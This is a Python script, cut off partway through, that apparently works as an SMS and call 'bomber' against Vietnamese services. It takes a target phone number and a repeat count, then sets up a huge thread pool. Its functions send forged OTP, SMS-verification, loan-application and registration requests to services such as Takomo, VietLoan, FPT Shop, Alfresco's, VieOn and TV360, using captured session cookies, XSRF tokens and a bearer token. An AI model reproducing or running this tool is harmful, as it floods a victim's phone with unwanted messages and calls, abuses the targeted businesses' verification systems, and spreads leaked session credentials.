import json
import urllib.request
import urllib
import uuid
import requests
import hmac
import threading
from concurrent.futures import ThreadPoolExecutor
import hashlib, random ,time
from datetime import datetime
import bs4,base64
from time import sleep
import requests
import os, sys, requests, random, json
import time
from re import search
from random import choice, randint, shuffle
import string

phone = sys.argv[1]
amount = int(sys.argv[2])
threading = ThreadPoolExecutor(max_workers=int(100000))
imei = uuid.uuid4()
ua = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.63 Safari/537.36',}
jsdt = {'phone_number': phone}
json_data = {
'feature': 'register',
'phone': '+84'+phone[1:11]}
headers = {
'Host': 'api.zalopay.vn',
'x-user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 ZaloPayClient/7.13.1 OS/14.6 Platform/ios Secured/false  ZaloPayWebClient/7.13.1',
'x-device-model': 'iPhone8,2',
'x-density': 'iphone3x',
'authorization': 'Bearer ',
'x-device-os': 'IOS',
'x-drsite': 'off',
'accept': '*/*',
'x-app-version': '7.13.1',
'accept-language': 'vi-VN;q=1.0, en-VN;q=0.9',
'user-agent': 'ZaloPay/7.13.1 (vn.com.vng.zalopay; build:503903; iOS 14.6.0) Alamofire/5.2.2',
'x-platform': 'NATIVE',
'x-os-version': '14.6'}
params = {'phone_number': "0"+phone[1:11]}
headerss = {
'Host': 'moca.vn',
'Accept': '*/*',
'Device-Token': str(imei),
'X-Requested-With': 'XMLHttpRequest',
'Accept-Language': 'vi',
'X-Moca-Api-Version': '2',
'platform': 'P_IOS-2.10.42',
'User-Agent': 'Pass/2.10.42 (iPhone; iOS 13.3; Scale/2.00)'}
paramss = {'phoneNumber': phone}
def generate_random_username(length=10):
	characters = string.ascii_letters + string.digits
	username = "".join(random.choice(characters) for _ in range(length))
	
	return username


def generate_random_email(length=10, domain="gmail.com"):
	characters = string.ascii_letters + string.digits
	local_part = "".join(random.choice(characters) for _ in range(length))
	email = f"{local_part}@{domain}"
	
	return email
def random_string(length):
            number = '0123456789'
            alpha = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNPQRSTUVWXYZ'
            id = ''
            for i in range(0,length,2):
                id += random.choice(number)
                id += random.choice(alpha)
            return id
def generateRandomString(length, minh):
    return ''.join(random.choices(minh, k=length))
def get_SECUREID():
    return ''.join(random.choices('0123456789abcdef', k=17))
def getimei():
    return generateRandomString(8, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(4, '0123456789abcdef')+'-'+generateRandomString(12, '0123456789abcdef')
def get_TOKEN():
    return generateRandomString(22, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+':'+generateRandomString(9, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(20, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(12, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(7, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(7, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(53, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(9, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'_'+generateRandomString(11, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')+'-'+generateRandomString(4, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ')
def call1_live(phone):
    cookies = {
        '_tt_enable_cookie': '1',
        '_ttp': 'bp0PcaY0E8ez94Ol0_mDs-3S5UQ',
        '_fw_crm_v': 'c1111869-b398-4fa2-ffc1-19cc10134469',
        '_hjSessionUser_2281843': 'eyJpZCI6ImQ1Mzg3NmExLThjZDktNTQ0OC1iNjFiLTBmMTI2NmEwNmNkNCIsImNyZWF0ZWQiOjE2OTQzMDczNzY2OTYsImV4aXN0aW5nIjp0cnVlfQ==',
        '_hjSessionUser_2281853': 'eyJpZCI6ImZmNjMxMjk0LWE0YmMtNTRmOS05MzgxLWY4ODVmY2UyMWYwOCIsImNyZWF0ZWQiOjE2OTQzMDczODQ2NTQsImV4aXN0aW5nIjp0cnVlfQ==',
        '_gid': 'GA1.2.1565910037.1701260924',
        '_gat_UA-187725374-2': '1',
        '_hjIncludedInSessionSample_2281843': '0',
        '_hjSession_2281843': 'eyJpZCI6IjAyMzE4NTVlLWVlMDAtNDU0YS05ZWY5LTQ3NmIzOGQ1ZmYyNiIsImNyZWF0ZWQiOjE3MDEyNjA5MjM3MTgsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6ZmFsc2V9',
        '_hjAbsoluteSessionInProgress': '1',
        '_cabinet_key': 'SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDM1MjA0Nzg5NA.jLrppOjyCmdCY2FAXpEPk_iCoYjLHLwYmOs1vp98I6E',
        '_ga_ZBQ18M247M': 'GS1.1.1701260923.4.1.1701260951.32.0.0',
        '_gcl_au': '1.1.380581755.1694307376.786203969.1701260952.1701260951',
        '_gat_UA-187725374-1': '1',
        '_ga_ZN0EBP68G5': 'GS1.1.1701260951.3.0.1701260952.59.0.0',
        '_hjIncludedInSessionSample_2281853': '0',
        '_hjSession_2281853': 'eyJpZCI6ImIyNzllYjM1LWU4ZGMtNDFkZC05MTEzLWU5NWU1ZjBkNWJlZiIsImNyZWF0ZWQiOjE3MDEyNjA5NTIzMzYsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6dHJ1ZX0=',
        '_ga': 'GA1.2.1878482389.1694307377',
    }

    headers = {
        'authority': 'lk.takomo.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi,fr-FR;q=0.9,fr;q=0.8,en-US;q=0.7,en;q=0.6,zh-CN;q=0.5,zh;q=0.4',
        'content-type': 'application/json;charset=UTF-8',
        # 'cookie': '_tt_enable_cookie=1; _ttp=bp0PcaY0E8ez94Ol0_mDs-3S5UQ; _fw_crm_v=c1111869-b398-4fa2-ffc1-19cc10134469; _hjSessionUser_2281843=eyJpZCI6ImQ1Mzg3NmExLThjZDktNTQ0OC1iNjFiLTBmMTI2NmEwNmNkNCIsImNyZWF0ZWQiOjE2OTQzMDczNzY2OTYsImV4aXN0aW5nIjp0cnVlfQ==; _hjSessionUser_2281853=eyJpZCI6ImZmNjMxMjk0LWE0YmMtNTRmOS05MzgxLWY4ODVmY2UyMWYwOCIsImNyZWF0ZWQiOjE2OTQzMDczODQ2NTQsImV4aXN0aW5nIjp0cnVlfQ==; _gid=GA1.2.1565910037.1701260924; _gat_UA-187725374-2=1; _hjIncludedInSessionSample_2281843=0; _hjSession_2281843=eyJpZCI6IjAyMzE4NTVlLWVlMDAtNDU0YS05ZWY5LTQ3NmIzOGQ1ZmYyNiIsImNyZWF0ZWQiOjE3MDEyNjA5MjM3MTgsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6ZmFsc2V9; _hjAbsoluteSessionInProgress=1; _cabinet_key=SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDM1MjA0Nzg5NA.jLrppOjyCmdCY2FAXpEPk_iCoYjLHLwYmOs1vp98I6E; _ga_ZBQ18M247M=GS1.1.1701260923.4.1.1701260951.32.0.0; _gcl_au=1.1.380581755.1694307376.786203969.1701260952.1701260951; _gat_UA-187725374-1=1; _ga_ZN0EBP68G5=GS1.1.1701260951.3.0.1701260952.59.0.0; _hjIncludedInSessionSample_2281853=0; _hjSession_2281853=eyJpZCI6ImIyNzllYjM1LWU4ZGMtNDFkZC05MTEzLWU5NWU1ZjBkNWJlZiIsImNyZWF0ZWQiOjE3MDEyNjA5NTIzMzYsImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6dHJ1ZX0=; _ga=GA1.2.1878482389.1694307377',
        'origin': 'https://lk.takomo.vn',
        'referer': 'https://lk.takomo.vn/?phone={phone}&amount=10000000&term=30&utm_campaign=278300&sub1=cpa&utm_content=CcoW6aBll2l4l9KCdyyytPKB3DTGJ2DIeM4vTJRQYJQcpuze&utm_source=accesstrade&utm_medium=cps&aff_sid=CcoW6aBll2l4l9KCdyyytPKB3DTGJ2DIeM4vTJRQYJQcpuze&atnct1=3837a451cd0abc5ce4069304c5442c87&atnct2=CcoW6aBll2l4l9KCdyyytPKB3DTGJ2DIeM4vTJRQYJQcpuze&atnct3=Hht1B000bug005yqk',
        'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
    }

    json_data = {
        'data': {
            'phone': phone,
            'code': 'resend',
            'channel': 'ivr',
        },
    }

    response = requests.post('https://lk.takomo.vn/api/4/client/otp/send', cookies=cookies, headers=headers, json=json_data)
###

def call4_live(phone):
    cookies = {
        '__cfruid': '0214d9e8af209f41a99c31909d55b1fa794e64a5-1716169766',
        '_gcl_au': '1.1.1721581356.1716169784',
        '_fbp': 'fb.1.1716169784117.1491741532',
        '_gid': 'GA1.2.1403097046.1716169784',
        'mousestats_vi': '8a1681c59c77b4c3b83c',
        'mousestats_si': '645ba57476cf30666b0a',
        '_tt_enable_cookie': '1',
        '_ttp': 'VinCF2ksYNXQuDsGgWjy4TUrwWY',
        '_clck': 'u3y9qj%7C2%7Cflx%7C0%7C1601',
        '_ym_uid': '1716169786377857558',
        '_ym_d': '1716169786',
        '_ym_isad': '2',
        '_ym_visorc': 'w',
        '_dc_gtm_UA-49883034-25': '1',
        'ec_cache_utm': 'bfa6aa1a-287f-c588-4dbb-29e26769fe56',
        'ec_cache_client': 'false',
        'ec_cache_client_utm': 'null',
        'ec_png_utm': 'bfa6aa1a-287f-c588-4dbb-29e26769fe56',
        'ec_png_client': 'false',
        'ec_png_client_utm': 'null',
        'ec_etag_utm': 'bfa6aa1a-287f-c588-4dbb-29e26769fe56',
        'ec_etag_client_utm': 'null',
        'ec_etag_client': 'false',
        '_ga': 'GA1.2.911504806.1716169784',
        '_clsk': '1misg5j%7C1716170600861%7C4%7C1%7Cs.clarity.ms%2Fcollect',
        'uid': 'bfa6aa1a-287f-c588-4dbb-29e26769fe56',
        'client': 'false',
        'client_utm': 'null',
        'XSRF-TOKEN': 'eyJpdiI6IjlXeGU2Rlk0QnhNQnV4eGlOSEJaVnc9PSIsInZhbHVlIjoiVU5ERk1MbFJ4VVBSOUFNVkVTMmZrQVZVMWQyZ2hZcWZZaklQREljdjB3Q0NHdXk1VVhMNzdOYWZ1RnFVWnIyVWxTU3pyODBVVUxNS3VoRTdPc0xNS3M3Zm9RMUlJdUV4TnZ2LzltSm4waXlJdzdHVENVVHE4Z1hRR1E5UUROdnkiLCJtYWMiOiIzN2NhMjRmYmZkMzU4MTYyZTFmNzczMmYzZDNkOTUwOTFmNTg2MjNkNjcyYzA3NGFlNzZkNDZiMWViMTZlNDFmIiwidGFnIjoiIn0%3D',
        'sessionid': 'eyJpdiI6Ikl0WHowZldLN1R0SjJnR0lZMCtKT3c9PSIsInZhbHVlIjoiS3BqZGJTNURIeGtuOEVRSnUvUkNBYUxuejB6RkREMmJTK3ZQTktHSEI3ZnBKMGtsK3drZ24xZDVvYkN3UjhsZ0lBaTlIVTNLNldNY2VPYzc1cjk5a2VOVEVaczRtWmNwUEttalQzMkU1OE9FdHEvbFFYUmt6L1MzTWhEUnBIbE0iLCJtYWMiOiJjOWM0NTU0N2FhOTY4MTAxYTdkOTc1Y2JmZTJlNzg0MTVlYjJlNWVlZmQyYWIyZDE3OWUyZTU3YzliYTEyMzBmIiwidGFnIjoiIn0%3D',
        'utm_uid': 'eyJpdiI6IkRYaEpwRTdBVG8wSEJiYkVkdzZSU0E9PSIsInZhbHVlIjoiN2FUakdoQ01MMWJjV0ZMMldwMGM3U2xKUWVoVlYxNWhpdkd3RHJHMkdkY1BaUVJieTFGRXp0T1NlaFo1ZHFYR28xRXVreUZYa2xjYk9qY1d6UlJiVitOVmFaZTR1TFF5OGg2UnNRSlRRZUhmM0loSElsYmRBLzV1dW9ZNDBWYWciLCJtYWMiOiJjMGE4MTE3MDQ0MjA5YWY5YjMwYWQ3YmJiODY5MmJhZjQwYjdhZWEyYWNmZjZkODExOWJhNjNhMjJlZmFkNTFhIiwidGFnIjoiIn0%3D',
        '_ga_EBK41LH7H5': 'GS1.1.1716169784.1.1.1716170652.3.0.0',
    }

    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'cache-control': 'max-age=0',
        'content-type': 'application/x-www-form-urlencoded',
        # 'cookie': '__cfruid=0214d9e8af209f41a99c31909d55b1fa794e64a5-1716169766; _gcl_au=1.1.1721581356.1716169784; _fbp=fb.1.1716169784117.1491741532; _gid=GA1.2.1403097046.1716169784; mousestats_vi=8a1681c59c77b4c3b83c; mousestats_si=645ba57476cf30666b0a; _tt_enable_cookie=1; _ttp=VinCF2ksYNXQuDsGgWjy4TUrwWY; _clck=u3y9qj%7C2%7Cflx%7C0%7C1601; _ym_uid=1716169786377857558; _ym_d=1716169786; _ym_isad=2; _ym_visorc=w; _dc_gtm_UA-49883034-25=1; ec_cache_utm=bfa6aa1a-287f-c588-4dbb-29e26769fe56; ec_cache_client=false; ec_cache_client_utm=null; ec_png_utm=bfa6aa1a-287f-c588-4dbb-29e26769fe56; ec_png_client=false; ec_png_client_utm=null; ec_etag_utm=bfa6aa1a-287f-c588-4dbb-29e26769fe56; ec_etag_client_utm=null; ec_etag_client=false; _ga=GA1.2.911504806.1716169784; _clsk=1misg5j%7C1716170600861%7C4%7C1%7Cs.clarity.ms%2Fcollect; uid=bfa6aa1a-287f-c588-4dbb-29e26769fe56; client=false; client_utm=null; XSRF-TOKEN=eyJpdiI6IjlXeGU2Rlk0QnhNQnV4eGlOSEJaVnc9PSIsInZhbHVlIjoiVU5ERk1MbFJ4VVBSOUFNVkVTMmZrQVZVMWQyZ2hZcWZZaklQREljdjB3Q0NHdXk1VVhMNzdOYWZ1RnFVWnIyVWxTU3pyODBVVUxNS3VoRTdPc0xNS3M3Zm9RMUlJdUV4TnZ2LzltSm4waXlJdzdHVENVVHE4Z1hRR1E5UUROdnkiLCJtYWMiOiIzN2NhMjRmYmZkMzU4MTYyZTFmNzczMmYzZDNkOTUwOTFmNTg2MjNkNjcyYzA3NGFlNzZkNDZiMWViMTZlNDFmIiwidGFnIjoiIn0%3D; sessionid=eyJpdiI6Ikl0WHowZldLN1R0SjJnR0lZMCtKT3c9PSIsInZhbHVlIjoiS3BqZGJTNURIeGtuOEVRSnUvUkNBYUxuejB6RkREMmJTK3ZQTktHSEI3ZnBKMGtsK3drZ24xZDVvYkN3UjhsZ0lBaTlIVTNLNldNY2VPYzc1cjk5a2VOVEVaczRtWmNwUEttalQzMkU1OE9FdHEvbFFYUmt6L1MzTWhEUnBIbE0iLCJtYWMiOiJjOWM0NTU0N2FhOTY4MTAxYTdkOTc1Y2JmZTJlNzg0MTVlYjJlNWVlZmQyYWIyZDE3OWUyZTU3YzliYTEyMzBmIiwidGFnIjoiIn0%3D; utm_uid=eyJpdiI6IkRYaEpwRTdBVG8wSEJiYkVkdzZSU0E9PSIsInZhbHVlIjoiN2FUakdoQ01MMWJjV0ZMMldwMGM3U2xKUWVoVlYxNWhpdkd3RHJHMkdkY1BaUVJieTFGRXp0T1NlaFo1ZHFYR28xRXVreUZYa2xjYk9qY1d6UlJiVitOVmFaZTR1TFF5OGg2UnNRSlRRZUhmM0loSElsYmRBLzV1dW9ZNDBWYWciLCJtYWMiOiJjMGE4MTE3MDQ0MjA5YWY5YjMwYWQ3YmJiODY5MmJhZjQwYjdhZWEyYWNmZjZkODExOWJhNjNhMjJlZmFkNTFhIiwidGFnIjoiIn0%3D; _ga_EBK41LH7H5=GS1.1.1716169784.1.1.1716170652.3.0.0',
        'origin': 'https://vietloan.vn',
        'priority': 'u=0, i',
        'referer': 'https://vietloan.vn/',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    }

    data = {
        '_token': [
            '3NWivxaONbIIAqijSJ54vdg4BuWN5r0kT6d0WRTd',
            '3NWivxaONbIIAqijSJ54vdg4BuWN5r0kT6d0WRTd',
        ],
        'amount': '5 000 000',
        'term': '14',
        'phone': phone[0]+phone[1:4]+phone[4:7]+phone[7:],
    }

    response = requests.post('https://vietloan.vn/guest/application/create', cookies=cookies, headers=headers, data=data)
def fptshop_live(phone):
    cookies = {
        'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc': '65691ad6-be70-4fd6-843e-101bf6d193a4',
        '__rtbh.lid': '%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22xwWh1BMAdzLeq3iGS9Ux%22%7D',
        'cf_clearance': '_oMXlHf_DcamFaxkbgqjofrCA2fYxC3lL0Z2fDn4gRw-1701423660-0-1-d6581fb1.b6cce524.81594051-0.2.1701423660',
        'fpt_uuid': '%2299f03ad1-87de-4d10-bb12-1f186985f834%22',
        'ajs_group_id': 'null',
        '_tt_enable_cookie': '1',
        '_ttp': 'oFl6VfbkNPPK2yaOkOiKnPM7RW7',
        'dtdz': 'c58d2161-febb-43b9-80d7-7ef75b2fa84d',
        '__RC': '4',
        '__R': '1',
        '_gcl_au': '1.1.2070799360.1716171052',
        '_ga': 'GA1.3.1580431268.1701423695',
        '_gid': 'GA1.3.1862061755.1716171052',
        '_gat': '1',
        '_aff_network': 'null',
        'vMobile': '1',
        '_fbp': 'fb.2.1716171053437.874216565',
        '__zi': '2000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_iX0Iyv-rUpetmGKY7dReA7T31ICSDkWxDKB5S5rtgFhrmWMmZa.1',
        '_sp_ses.d55b': '*',
        '_sp_id.d55b': '142b63bc-e11b-4182-a776-a1c39975a7df.1716171054.1.1716171054..14396064-74ff-41ba-a21d-d27b77215ca4....0',
        '__uidac': 'cdc3f85f7f86ca54350107d3e35cb55e',
        '__admUTMtime': '1716171054',
        '_hjSessionUser_731679': 'eyJpZCI6ImM3M2UxNTI5LTdjZDgtNWZlMS1hODJjLTg1NzhlZjg0MDg4YiIsImNyZWF0ZWQiOjE3MDE0MjM2OTYzMzUsImV4aXN0aW5nIjp0cnVlfQ==',
        '_hjSession_731679': 'eyJpZCI6Ijg0ZGEyY2Y2LTg2NjUtNDc3Ny05YzlhLTdhODY3YmJjOWE5YSIsImMiOjE3MTYxNzEwNTQ2MTEsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=',
        'cf_clearance': 'PocSx2Vzp2sDp85ilieudqO.HZkaMR4MjPmM.yDjOPg-1716171038-1.0.1.1-imyWV8OfbqxORl_vqCyEBQYZXHpX0iVy6RcaycH7ZsTaKNwnp.lJEZMyRGkM3q9r.7hf5axkfm5Gt.2NKMnO9g',
        '__adm_upl': 'eyJ0aW1lIjoxNzE2MTcyODM4LCJfdXBsIjoiMC00NTAxNDIzNjYxNzEyMTYxNTY5In0=',
        '__iid': '',
        '__iid': '',
        '__su': '0',
        '__su': '0',
        '__uif': '__uid%3A4501423661712161569%7C__ui%3A-1%7C__create%3A1701423661',
        '__tb': '0',
        '__IP': '712161569',
        '_ga_ZR815NQ85K': 'GS1.1.1716171051.2.0.1716171055.56.0.0',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc=65691ad6-be70-4fd6-843e-101bf6d193a4; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22xwWh1BMAdzLeq3iGS9Ux%22%7D; cf_clearance=_oMXlHf_DcamFaxkbgqjofrCA2fYxC3lL0Z2fDn4gRw-1701423660-0-1-d6581fb1.b6cce524.81594051-0.2.1701423660; fpt_uuid=%2299f03ad1-87de-4d10-bb12-1f186985f834%22; ajs_group_id=null; _tt_enable_cookie=1; _ttp=oFl6VfbkNPPK2yaOkOiKnPM7RW7; dtdz=c58d2161-febb-43b9-80d7-7ef75b2fa84d; __RC=4; __R=1; _gcl_au=1.1.2070799360.1716171052; _ga=GA1.3.1580431268.1701423695; _gid=GA1.3.1862061755.1716171052; _gat=1; _aff_network=null; vMobile=1; _fbp=fb.2.1716171053437.874216565; __zi=2000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_iX0Iyv-rUpetmGKY7dReA7T31ICSDkWxDKB5S5rtgFhrmWMmZa.1; _sp_ses.d55b=*; _sp_id.d55b=142b63bc-e11b-4182-a776-a1c39975a7df.1716171054.1.1716171054..14396064-74ff-41ba-a21d-d27b77215ca4....0; __uidac=cdc3f85f7f86ca54350107d3e35cb55e; __admUTMtime=1716171054; _hjSessionUser_731679=eyJpZCI6ImM3M2UxNTI5LTdjZDgtNWZlMS1hODJjLTg1NzhlZjg0MDg4YiIsImNyZWF0ZWQiOjE3MDE0MjM2OTYzMzUsImV4aXN0aW5nIjp0cnVlfQ==; _hjSession_731679=eyJpZCI6Ijg0ZGEyY2Y2LTg2NjUtNDc3Ny05YzlhLTdhODY3YmJjOWE5YSIsImMiOjE3MTYxNzEwNTQ2MTEsInMiOjAsInIiOjAsInNiIjowLCJzciI6MCwic2UiOjAsImZzIjowLCJzcCI6MX0=; cf_clearance=PocSx2Vzp2sDp85ilieudqO.HZkaMR4MjPmM.yDjOPg-1716171038-1.0.1.1-imyWV8OfbqxORl_vqCyEBQYZXHpX0iVy6RcaycH7ZsTaKNwnp.lJEZMyRGkM3q9r.7hf5axkfm5Gt.2NKMnO9g; __adm_upl=eyJ0aW1lIjoxNzE2MTcyODM4LCJfdXBsIjoiMC00NTAxNDIzNjYxNzEyMTYxNTY5In0=; __iid=; __iid=; __su=0; __su=0; __uif=__uid%3A4501423661712161569%7C__ui%3A-1%7C__create%3A1701423661; __tb=0; __IP=712161569; _ga_ZR815NQ85K=GS1.1.1716171051.2.0.1716171055.56.0.0',
        'Origin': 'https://fptshop.com.vn',
        'Referer': 'https://fptshop.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
    }

    data = {
        'phone': phone,
        'typeReset': '0',
    }

    response = requests.post('https://fptshop.com.vn/api-data/loyalty/Login/Verification', cookies=cookies, headers=headers, data=data)
def af_live(phone):
    headers = {
        'authority': 'api.alfrescos.com.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN',
        'brandcode': 'ALFRESCOS',
        'content-type': 'application/json',
        'devicecode': 'web',
        'origin': 'https://alfrescos.com.vn',
        'referer': 'https://alfrescos.com.vn/',
        'sec-ch-ua': '"Google Chrome";v="119", "Chromium";v="119", "Not?A_Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36',
    }

    params = {
        'culture': 'vi-VN',
    }

    json_data = {
        'phoneNumber': phone,
        'secureHash': '89b4c1ea1b74bac29a66281dbd879e00',
        'deviceId': '',
        'sendTime': 1701424097166,
        'type': 1,
    }

    response = requests.post('https://api.alfrescos.com.vn/api/v1/User/SendSms', params=params, headers=headers, json=json_data)

    # Note: json_data will not be serialized by requests
    # exactly as it was in the original request.
    #data = '{"phoneNumber":"0352047894","secureHash":"89b4c1ea1b74bac29a66281dbd879e00","deviceId":"","sendTime":1701424097166,"type":1}'
    #response = requests.post('https://api.alfrescos.com.vn/api/v1/User/SendSms', params=params, headers=headers, data=data)
def vieon_live(phone):
    headers = {
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'authorization': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MDE1OTc0MDQsImp0aSI6ImU3NDViZDYwZDMxNzBhNDkxMDkyZGE0MjNjMGMxZTE0IiwiYXVkIjoiIiwiaWF0IjoxNzAxNDI0NjA0LCJpc3MiOiJWaWVPbiIsIm5iZiI6MTcwMTQyNDYwMywic3ViIjoiYW5vbnltb3VzX2Q3YTVmZjVlOTUzYTBjNjI5NjIxNzQ4MWI1ZTQ1Y2JkLTczOTNjNjUwODRlNDAxZDIxMjAwMTRiMzY5MDIxYTY4LTE3MDE0MjQ2MDQiLCJzY29wZSI6ImNtOnJlYWQgY2FzOnJlYWQgY2FzOndyaXRlIGJpbGxpbmc6cmVhZCIsImRpIjoiZDdhNWZmNWU5NTNhMGM2Mjk2MjE3NDgxYjVlNDVjYmQtNzM5M2M2NTA4NGU0MDFkMjEyMDAxNGIzNjkwMjFhNjgtMTcwMTQyNDYwNCIsInVhIjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzExOS4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiZHQiOiJ3ZWIiLCJtdGgiOiJhbm9ueW1vdXNfbG9naW4iLCJtZCI6IldpbmRvd3MgMTAiLCJpc3ByZSI6MCwidmVyc2lvbiI6IiJ9.pocLkuu4BpueiMmo58wj3fgfL8hlKcuIIoZuJmpK2VU',
        'content-type': 'application/json',
        'origin': 'https://vieon.vn',
        'priority': 'u=1, i',
        'referer': 'https://vieon.vn/auth/?destination=/&page=/',
        'sec-ch-ua': '"Google Chrome";v="125", "Chromium";v="125", "Not.A/Brand";v="24"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
    }

    params = {
        'platform': 'web',
        'ui': '012021',
    }

    json_data = {
        'username': phone,
        'country_code': 'VN',
        'model': 'Windows 10',
        'device_id': '4878ec81b072b0a77568cf0846bf2aa1',
        'device_name': 'Chrome/125',
        'device_type': 'desktop',
        'platform': 'web',
        'ui': '012021',
    }

    response = requests.post('https://api.vieon.vn/backend/user/v2/register', params=params, headers=headers, json=json_data)
def tv360_live(phone):
    cookies = {
        'acw_tc': 'f1a08ff1fbc861b0b3cf5f6560c6d2f61cc1f49ebd7ec4fdd09660977ad81c23',
        'img-ext': 'avif',
        'NEXT_LOCALE': 'vi',
        'device-id': 's%3Aweb_d4a779ab-14fc-4887-91fc-b1a14b30a2e6.yUg55IGhm5oozKBmXxwZjYrSl3ZpHtOEO55WRRCKkpI',
        'shared-device-id': 'web_d4a779ab-14fc-4887-91fc-b1a14b30a2e6',
        'screen-size': 's%3A1600x900.D5hmv7jHev4y5hX3B2q622HuIeLv2TWEm7OgzGkxojg',
        '_ga': 'GA1.2.1336579171.1701425063',
        '_gid': 'GA1.2.1702255266.1701425063',
        '_gat_UA-180935206-1': '1',
        'G_ENABLED_IDPS': 'google',
